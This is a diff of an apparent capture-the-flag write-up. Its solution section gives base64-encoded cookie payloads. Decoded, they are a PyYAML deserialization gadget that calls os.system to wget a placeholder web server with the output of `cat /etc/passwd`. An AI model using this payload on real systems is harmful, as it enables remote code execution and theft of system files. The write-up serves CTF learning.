@@ -25,4 +25,4 @@ so a friend gave me a link `https://xerosecurity.com/wordpress/exploiting-python
 ## Solution
 Run a web server with `python3 -m http.server`.
 
-Payload: `Imdvb2RieWUiOiAhIXB5dGhvbi9vYmplY3QvYXBwbHk6b3Muc3lzdGVtIFsid2dldCBodHRwOi8veW91ci13ZWItc2VydmVyLWlwLz9gY2F0IC9ldGMvcGFzc3dkYCJd` (decode it to know the answer and put your data and decode it again and input it as a cookie)
+Payload: `Imdvb2RieWUiOiAhIXB5dGhvbi9vYmplY3QvYXBwbHk6b3Muc3lzdGVtIFsid2dldCBodHRwczovL3lvdXItd2ViLXNlcnZlci8/JTYwY2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAnRidgIl0K` (decode it to know the answer and put your data and decode it again and input it as a cookie)
